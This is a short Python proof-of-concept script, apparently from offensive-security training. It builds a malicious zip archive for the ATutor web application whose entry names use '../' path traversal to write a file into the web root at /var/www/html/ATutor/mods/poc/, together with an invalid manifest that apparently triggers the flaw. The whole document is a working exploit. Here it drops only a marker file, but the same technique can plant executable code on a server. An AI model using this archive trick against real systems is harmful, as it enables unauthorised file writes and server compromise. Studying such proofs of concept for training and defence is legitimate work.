#!/usr/bin/python3
import zipfile
#from cStringIO import StringIO
from io import BytesIO

def _build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    #z.writestr('../../../../../var/tmp/poc/poc.txt', 'offsec')
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', 'offsec')
    z.writestr('imsmanifest.xml', 'invalidTag')
    z.close()
    zip_file = open('poc.zip', 'wb')
    zip_file.write(f.getvalue())
    zip_file.close()


_build_zip()
